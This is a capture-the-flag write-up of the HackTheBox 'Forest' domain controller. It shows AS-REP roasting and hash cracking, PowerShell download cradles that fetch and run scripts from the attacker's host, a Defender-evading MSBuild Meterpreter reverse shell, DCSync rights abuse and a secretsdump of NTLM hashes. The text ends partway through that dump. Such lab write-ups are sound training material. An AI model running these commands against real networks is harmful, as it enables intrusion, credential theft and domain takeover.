---
title: "HackTheBox Writeup: Forest"
date: 2020-03-21T00:57:34+01:00
toc: true
showdate: true
tags:
  - hackthebox
  - ctf
  - writeup
---

Forest was a great box, maybe not for its originality, but it is a very good challenge to introduce people to extremely useful techniques and tools for Windows exploitation and especially privilege escalation, even if I might be a little biased because I tend to like any CTF that has to do with Active Directory, my number one focus of studying at the moment.

Long story short, the credentials of a service account are obtained by cracking a Kerberos Ticket-Granting Ticket (TGT). From there privileges can be escalated by changing the DACL of a user object by giving it DCSync rights and dumping all hashes and secrets of all domain users.

Warning: this writeup might be a little messy because I forgot to organize my notes properly while doing this challenge. Good job me. I wouldn't be surprised if a command was missing.

![img](/images/writeup-forest/1.png)

---

## Enumeration

From an initial nmap scan we can tell the host is an Active Directory domain controller judging from the services available, like DNS (53), Kerberos (88), SMB (445), LDAP (389), and several RPC programs running in the highest ports:

```aaa
┌─[baud@parrot]─[~/HTB/forest]
└──╼ $cat nmap.nmap
# Nmap 7.80 scan initiated Wed Dec  4 21:09:36 2019 as: nmap -sC -sV -oA nmap -p- -T4 10.10.10.161
Nmap scan report for 10.10.10.161
Host is up (0.16s latency).
Not shown: 65511 closed ports
PORT     STATE SERVICE      VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-03-21 00:28:08Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49684/tcp open  msrpc        Microsoft Windows RPC
49706/tcp open  msrpc        Microsoft Windows RPC
49900/tcp open  msrpc        Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=3/21%Time=5E755C99%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h47m32s, deviation: 4h37m09s, median: 7m31s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2019-12-04T12:19:51-08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2019-12-04T20:19:54
|_  start_date: 2019-12-04T19:11:37

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Dec  4 21:14:33 2019 -- 1 IP address (1 host up) scanned in 297.47 seconds
```

The output of the smb-security-mode NSE scripts tells us Guest login is allowed on SMB and this can be leveraged to enumerate users. The task can be automated using [enum4linux](https://github.com/portcullislabs/enum4linux), which can enumerate users with the -U flag and will first attempt to list users using SMB, if that fails it will rely to RID cycling via RPC.

Luckily SMB users can be listed on this box and enum4linux returns a list of all users present on the machine:

```aaa
┌─[✗]─[baud@parrot]─[~/HTB/forest]
└──╼ $enum4linux -U 10.10.10.161 2>/dev/null
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Mar 20 22:50:09 2020

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.10.161
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on 10.10.10.161    |
 ==================================================== 
[E] Can't find workgroup/domain


 ===================================== 
|    Session Check on 10.10.10.161    |
 ===================================== 
[+] Server 10.10.10.161 allows sessions using username '', password ''
[+] Got domain/workgroup name: 

 =========================================== 
|    Getting domain SID for 10.10.10.161    |
 =========================================== 
Domain Name: HTB
Domain Sid: S-1-5-21-3072663084-364016917-1341370565
[+] Host is part of a domain (not a workgroup)

 ============================= 
|    Users on 10.10.10.161    |
 ============================= 
index: 0x2137 RID: 0x463 acb: 0x00020015 Account: $331000-VK4ADACQNUCA	Name: (null)	Desc: (null)
index: 0xfbc RID: 0x1f4 acb: 0x00020010 Account: Administrator	Name: Administrator	Desc: Built-in account for administering the computer/domain
index: 0x2369 RID: 0x47e acb: 0x00000210 Account: andy	Name: Andy Hislip	Desc: (null)
index: 0x2374 RID: 0x1db3 acb: 0x00000010 Account: brainfuck	Name: brainfuck	Desc: (null)
index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount	Name: (null)	Desc: A user account managed by the system.
index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
index: 0x2352 RID: 0x478 acb: 0x00000210 Account: HealthMailbox0659cc1	Name: HealthMailbox-EXCH01-010	Desc: (null)
index: 0x234b RID: 0x471 acb: 0x00000210 Account: HealthMailbox670628e	Name: HealthMailbox-EXCH01-003	Desc: (null)
index: 0x234d RID: 0x473 acb: 0x00000210 Account: HealthMailbox6ded678	Name: HealthMailbox-EXCH01-005	Desc: (null)
index: 0x2351 RID: 0x477 acb: 0x00000210 Account: HealthMailbox7108a4e	Name: HealthMailbox-EXCH01-009	Desc: (null)
index: 0x234e RID: 0x474 acb: 0x00000210 Account: HealthMailbox83d6781	Name: HealthMailbox-EXCH01-006	Desc: (null)
index: 0x234c RID: 0x472 acb: 0x00000210 Account: HealthMailbox968e74d	Name: HealthMailbox-EXCH01-004	Desc: (null)
index: 0x2350 RID: 0x476 acb: 0x00000210 Account: HealthMailboxb01ac64	Name: HealthMailbox-EXCH01-008	Desc: (null)
index: 0x234a RID: 0x470 acb: 0x00000210 Account: HealthMailboxc0a90c9	Name: HealthMailbox-EXCH01-002	Desc: (null)
index: 0x2348 RID: 0x46e acb: 0x00000210 Account: HealthMailboxc3d7722	Name: HealthMailbox-EXCH01-Mailbox-Database-1118319013	Desc: (null)
index: 0x2349 RID: 0x46f acb: 0x00000210 Account: HealthMailboxfc9daad	Name: HealthMailbox-EXCH01-001	Desc: (null)
index: 0x234f RID: 0x475 acb: 0x00000210 Account: HealthMailboxfd87238	Name: HealthMailbox-EXCH01-007	Desc: (null)
index: 0xff4 RID: 0x1f6 acb: 0x00020011 Account: krbtgt	Name: (null)	Desc: Key Distribution Center Service Account
index: 0x2360 RID: 0x47a acb: 0x00000210 Account: lucinda	Name: Lucinda Berger	Desc: (null)
index: 0x236a RID: 0x47f acb: 0x00000210 Account: mark	Name: Mark Brandt	Desc: (null)
index: 0x236b RID: 0x480 acb: 0x00000210 Account: santi	Name: Santi Rodriguez	Desc: (null)
index: 0x235c RID: 0x479 acb: 0x00000210 Account: sebastien	Name: Sebastien Caron	Desc: (null)
index: 0x215a RID: 0x468 acb: 0x00020011 Account: SM_1b41c9286325456bb	Name: Microsoft Exchange Migration	Desc: (null)
index: 0x2161 RID: 0x46c acb: 0x00020011 Account: SM_1ffab36a2f5f479cb	Name: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}	Desc: (null)
index: 0x2156 RID: 0x464 acb: 0x00020011 Account: SM_2c8eef0a09b545acb	Name: Microsoft Exchange Approval Assistant	Desc: (null)
index: 0x2159 RID: 0x467 acb: 0x00020011 Account: SM_681f53d4942840e18	Name: Discovery Search Mailbox	Desc: (null)
index: 0x2158 RID: 0x466 acb: 0x00020011 Account: SM_75a538d3025e4db9a	Name: Microsoft Exchange	Desc: (null)
index: 0x215c RID: 0x46a acb: 0x00020011 Account: SM_7c96b981967141ebb	Name: E4E Encryption Store - Active	Desc: (null)
index: 0x215b RID: 0x469 acb: 0x00020011 Account: SM_9b69f1b9d2cc45549	Name: Microsoft Exchange Federation Mailbox	Desc: (null)
index: 0x215d RID: 0x46b acb: 0x00020011 Account: SM_c75ee099d0a64c91b	Name: Microsoft Exchange	Desc: (null)
index: 0x2157 RID: 0x465 acb: 0x00020011 Account: SM_ca8c2ed5bdab4dc9b	Name: Microsoft Exchange	Desc: (null)
index: 0x2365 RID: 0x47b acb: 0x00010210 Account: svc-alfresco	Name: svc-alfresco	Desc: (null)

user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
enum4linux complete on Fri Mar 20 22:50:26 2020
```

The list of users appears twice in different formats in the output because enum4linux will try to list them using two different smbclient commands. With this output we can lay down a list of valid users in a file:

```aaa
┌─[✗]─[baud@parrot]─[~/HTB/forest]
└──╼ $cat users
Administrator
krbtgt
sebastien
lucinda
svc-alfresco
andy
mark
santi
```

With a list of valid usernames there are a few paths that can be taken, the right one for this box is [Kerberos AS-REPRoasting](https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/), an attack that can give us the hash of a domain account which does not have Kerberos preauthentication enabled.

[Impacket](https://github.com/SecureAuthCorp/impacket)'s GetNPUsers.py tool was written to look for this kind of accounts and request for their Ticket-Granting Tickets (TGT), from which the account's password can be cracked offline. As stated by the script's guide, an attacker doesn't necessarely need a valid set of credentials to query the target for these tickets:

```aaa
1. Get a TGT for a user:

	GetNPUsers.py contoso.com/john.doe -no-pass

For this operation you don't need john.doe's password. It is important tho, to specify -no-pass in the script, 
otherwise a badpwdcount entry will be added to the user
```

---

## Exploitation: Kerberos AS-REPRoasting

GetNPUsers.py has a very useful -usersfile flag to include a dictionary of users to query for, so in just a command we can scan the host for all users without Kerberos preauthentication, and one returns positive:

```aaa
┌─[✗]─[baud@parrot]─[~/HTB/forest]
└──╼ $python /usr/share/doc/python-impacket/examples/GetNPUsers.py htb.local/ -usersfile users -no-pass -dc-ip 10.10.10.161
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:b8bd5c57c75931d7d091b56541ad66e6$41d7f5e6af236aeeaf22932c809de144b4a9d9e87202df108b332b5289620f214d9d8edc4728f9cda60560d7f718aa91788a65b463b0d75a20711b2b04da0c6c742b731ea0cc9fd1ca7197f9fb47a69a39a7a850c6705de5e6e0b5693d88953f8a87bde312cdc85ad4573223555aac5e95408e374842113c86aa3f611c23a2c9a5148a8af83e037bdea6dab6afc858f3d55e2806eb33f7a6cce84541b87be06ae2b7e92820f04db1e742ea6ffdbb75db68c2e81b3cf27d7e9003bd10b299461e3423fb72de3fdb1ab588b88d4075348e745943ead8c5e6bf9aea7fa82a19e407d2e910623641
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] invalid principal syntax
```

We have grabbed svc-alfresco's TGT, which contains a hash that can be passed to hashcat with mode number 18200 (Kerberos 5 AS-REP etype 23) to obtain a clear text password for the account: 

```aaa
┌─[baud@parrot]─[~/HTB/forest]
└──╼ $hashcat -a 0 -m 18200 hash /usr/share/wordlists/rockyou.txt --force
hashcat (v5.1.0) starting...

OpenCL Platform #1: The pocl project
====================================
* Device #1: pthread-Intel(R) Core(TM) i7-8700 CPU @ 3.20GHz, 1024/2939 MB allocatable, 1MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

ATTENTION! Pure (unoptimized) OpenCL kernels selected.
This enables cracking passwords and salts > length 32 but for the price of drastically reduced performance.
If you want to switch to optimized OpenCL kernels, append -O to your commandline.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D LOCAL_MEM_TYPE=2 -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=8 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=1 -D DGST_R2=2 -D DGST_R3=3 -D DGST_ELEM=4 -D KERN_TYPE=18200 -D _unroll'
* Device #1: Kernel m18200_a0-pure.9ecc3688.kernel not found in cache! Building may take a while...
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5asrep$23$svc-alfresco@HTB.LOCAL:b8bd5c57c75931d7d091b56541ad66e6$41d7f5e6af236aeeaf22932c809de144b4a9d9e87202df108b332b5289620f214d9d8edc4728f9cda60560d7f718aa91788a65b463b0d75a20711b2b04da0c6c742b731ea0cc9fd1ca7197f9fb47a69a39a7a850c6705de5e6e0b5693d88953f8a87bde312cdc85ad4573223555aac5e95408e374842113c86aa3f611c23a2c9a5148a8af83e037bdea6dab6afc858f3d55e2806eb33f7a6cce84541b87be06ae2b7e92820f04db1e742ea6ffdbb75db68c2e81b3cf27d7e9003bd10b299461e3423fb72de3fdb1ab588b88d4075348e745943ead8c5e6bf9aea7fa82a19e407d2e910623641:s3rvice
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: Kerberos 5 AS-REP etype 23
Hash.Target......: $krb5asrep$23$svc-alfresco@HTB.LOCAL:b8bd5c57c75931...623641
Time.Started.....: Fri Dec  6 17:24:44 2019 (9 secs)
Time.Estimated...: Fri Dec  6 17:24:53 2019 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   445.6 kH/s (6.88ms) @ Accel:64 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 4087808/14344385 (28.50%)
Rejected.........: 0/4087808 (0.00%)
Restore.Point....: 4083712/14344385 (28.47%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: s523480 -> s2704081

Started: Fri Dec  6 17:24:38 2019
Stopped: Fri Dec  6 17:24:54 2019
```

So the user's credentials turned out to be:

```aaa
User: svc-alfresco
Pass: s3rvice
```




[evil-winrm](https://github.com/Hackplayers/evil-winrm) can be used to login through WinRM, which is running on port 5985 and that nmap usually recognizes as "Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)":

```aaa
┌─[✗]─[baud@parrot]─[~/HTB/forest]
└──╼ $evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice -s ~/http/windows/ -e ~/http/windows/

Evil-WinRM shell v2.0

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents>
```

---

## Local Enumeration: Bloodhound

[Bloodhound](https://github.com/BloodHoundAD/BloodHound) can be used to gather data from the compromised host, showing possible relationships between Active Directory objects that could allow for a privilege escalation attack if properly exploited.

In reality Bloodhound is the program local to the attacker's host, the data is collected in a .zip archive by an *ingestor*, like [SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Ingestors), which is available in two formats, exe and ps1.

I prefer using the PowerShell ingestor because it can be launched from memory without dropping an executable on disk using a download cradle from a normal PowerShell shell, which evil-winrm opens by default:

```aaa
IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.144/Sharphound.ps1")
```

However by using this method Sharphound will not return any output and will not create any archive file, meaning the script is erroring out and for some reason evil-winrm has issues dealing with output from stderr:

```aaa
PS htb\svc-alfresco@FOREST Documents> Invoke-BloodHound
PS htb\svc-alfresco@FOREST Documents> 
```

One way to bypass this issue is ditching evil-winrm altogether in favor of a better shell, such as a Metasploit session (although a simple nc shell would have probably worked as well).

Because plain Meterpreter payloads are flagged instantly by Defender I used [GreatSCT](https://github.com/GreatSCT/GreatSCT) to generate an MSBuild payload (more info on the full process [here](https://offsecdeer.gitlab.io/post/htb-writeup-arkham/#getting-root---the-real-mens-way-uac-bypass)).

Start up the Meterpreter listener with the resource file given to us by GreatSCT:

```aaa
┌─[baud@parrot]─[~/HTB/forest]
└──╼ $msfconsole -r forest.rc
[-] ***rting the Metasploit Framework console...\
[-] * WARNING: No database support: No database YAML file
[-] ***
                                                  
IIIIII    dTb.dTb        _.---._
  II     4'  v  'B   .'"".'/|\`.""'.
  II     6.     .P  :  .' / | \ `.  :
  II     'T;. .;P'  '.'  /  |  \  `.'
  II      'T; ;P'    `. /   |   \ .'
IIIIII     'YvP'       `-.__|__.-'

I love shells --egypt


       =[ metasploit v5.0.53-dev                          ]
+ -- --=[ 1932 exploits - 1079 auxiliary - 331 post       ]
+ -- --=[ 556 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

[*] Processing forest.rc for ERB directives.
resource (forest.rc)> use exploit/multi/handler
resource (forest.rc)> set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
resource (forest.rc)> set LHOST 10.10.14.144
LHOST => 10.10.14.144
resource (forest.rc)> set LPORT 4444
LPORT => 4444
resource (forest.rc)> set ExitOnSession false
ExitOnSession => false
resource (forest.rc)> exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
```

Back in the evil-winrm shell download the XML payload and feed it to MSBuild:

```aaa
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> iwr "http://10.10.14.144:9090/forest.xml" -outfile "./man.xml"
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe man.xml
Microsoft (R) Build Engine version 4.6.1586.0
[Microsoft .NET Framework, version 4.0.30319.42000]
Copyright (C) Microsoft Corporation. All rights reserved.

Build started 12/6/2019 4:46:57 PM.
```

The payload is compiled in real time and a session is received:

```aaa
[*] Started reverse TCP handler on 10.10.14.144:4444 
msf5 exploit(multi/handler) > [*] Sending stage (180291 bytes) to 10.10.10.161
[*] Meterpreter session 1 opened (10.10.14.144:4444 -> 10.10.10.161:55075) at 2019-12-07 01:39:29 +0100

msf5 exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: HTB\svc-alfresco
```

Now with the *shell* command I opened a command prompt instance and from there I started PowerShell with *powershell*, loaded SharpHound in memory with the download cradle from earlier, and after launching it an error appeared clarifying the source of the error, LDAP:

```aaa
PS C:\Users\svc-alfresco\Documents> Invoke-Bloodhound -CollectionMethod All                 
Invoke-Bloodhound -CollectionMethod All
Initializing BloodHound at 5:43 PM on 12/6/2019
Ldap Connection Failure.
Try again with the IgnoreLdapCert option if using SecureLDAP or check your DomainController/LdapPort option
```

Despite that suggestion using the -IgnoreLdapCert option does not solve the issue, what does it is simply providing LDAP credentials, because anonymous access to LDAP on the box is not allowed:

```aaa
PS C:\Users\svc-alfresco\Documents> Invoke-Bloodhound -CollectionMethod All -LdapUser svc-alfresco -LdapPass s3rvice
Invoke-Bloodhound -CollectionMethod All -LdapUser svc-alfresco -LdapPass s3rvice
Initializing BloodHound at 5:44 PM on 12/6/2019
Resolved Collection Methods to Group, LocalAdmin, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets
Starting Enumeration for htb.local
Status: 123 objects enumerated (+123 41/s --- Using 86 MB RAM )
Finished enumeration for htb.local in 00:00:03.4082754
1 hosts failed ping. 0 hosts timedout.

Compressing data to C:\Users\svc-alfresco\Documents\20191206174432_BloodHound.zip.
You can upload this file directly to the UI.
Finished compressing files!
```

Thanks to Meterpreter the archive with all the information gathered by Bloodhound is downloaded very easily on the attacking host:

```aaa
meterpreter > download 20191206174432_BloodHound.zip /home/baud/
[*] Downloading: 20191206174432_BloodHound.zip -> /home/baud/20191206174432_BloodHound.zip
[*] Downloaded 12.65 KiB of 12.65 KiB (100.0%): 20191206174432_BloodHound.zip -> /home/baud/20191206174432_BloodHound.zip
[*] download   : 20191206174432_BloodHound.zip -> /home/baud/20191206174432_BloodHound.zip
```

And Bloodhound can be launched locally to take a look at possible privilege escalation paths:

1) `sudo neo4j console`
2) `bloodhound`

Once imported the data I looked for a connection between the account we already control, svc-alfresco, and the administrators group (only later I realized the DCSync pre-made query would have found a much more intuitive path). A path was quickly found:

![img](/images/writeup-forest/2.png)

---

## Exchange Windows Permissions Privilege Abuse

The group memberships of svc-alfresco allow the user to write data on to the group object Exchange Windows Permissions, which is a notoriously over-privileged domain group used by Microsoft Exchange to set up a new Exchange installation.

In order for the new installation to be deployed the domain needs to be tweaked, and so the installer needs write permissions over the domain. This has some serious security implications because any member of the Exchange Windows Permissions can write arbitrary data onto the domain and its child objects, such as the Administrator account shown in the graph.

Because the permission shown by Bloodhound is WriteDacl it means any member of the Exchange Windows Permissions group can change the DACL of any object contained in the domain, giving those users the ability of granting or revoking additional rights to themselves or other users. This is exactly what will allow us to escalate privileges.

[PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) is probably the best tool to manipulate AD objects, so let's load it into our PowerShell session:

```powershell
IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.144/PowerView.ps1")
```

Let's make ourselves owners of the Exchange Windows Permissions group object so that we can make changes to it:

```powershell
Set-DomainObjectOwner -Identity "Exchange Windows Permissions" -OwnerIdentity svc-alfresco
```

Now we can add ourselves to the group, granting us write permissions across the entire domain:

```powershell
Add-DomainGroupMember -Identity "Exchange Windows Permissions" -Members "svc-alfresco"
```

For the attack that I have in mind I'm going to need to create a new account to not mess up svc-alfresco's rights too much for other users, so first I create a password in SecureString format:

```powershell
$password = ConvertTo-SecureString "Password123!" -AsPlainText -Force
```

And then a new account is made with that password:

```powershell
New-DomainUser -SamAccountName Baudy -AccountPassword $password
```

If we want to use the account for some reason we can always add it to the Remote Management Users group: 

```powershell
Add-DomainGroupMember -Identity "Remote Management Users" -Members Baudy
```

This way we can log into that account using WinRM:

```aaa
┌─[✗]─[baud@parrot]─[/opt/impacket/examples]
└──╼ $evil-winrm -i forest -u Baudy -p "Password123!"

Evil-WinRM shell v2.0

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Baudy\Documents> 
```

But it is not necessary.

---

## Privilege Escalation: DCSync + Pass The Hash

We have DaclWrite permissions across the domain and a new user to play with, what could go wrong? 

PowerView has a neat function to add all the necessary user rights to perform a [DCSync](https://adsecurity.org/?p=1729) attack, all we need to do is to grant ourselves those rights with the DCSync option:

```powershell
Add-DomainObjectAcl -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity Baudy -Rights DCSync
```

DCSync works by communicating with a domain controller and pretending to be another domain controller in the domain, and using the Directory Replication Service Remote Protocol to request some data off the target that the local DC needs to update, which of course for us means password hashes.

Another one of Impacket's tools, secretsdump.py, makes use of DCSync to do just that, dump all credentials of all accounts in the NTDS.dit database:

```aaa
┌─[baud@parrot]─[/opt/impacket/examples]
└──╼ $sudo ./secretsdump.py -target-ip forest -dc-ip forest htb.local/baudy@forest
[sudo] password for baud: 
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

Password:
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\HealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f:::
htb.local\HealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44:::
htb.local\HealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05:::
htb.local\HealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a:::
htb.local\HealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9:::
htb.local\HealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555:::
htb.local\HealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5:::
htb.local\HealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff:::
htb.local\HealthMailboxb01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203:::
htb.local\HealthMailbox7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355:::
htb.local\HealthMailbox0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536:::
htb.local\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
htb.local\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
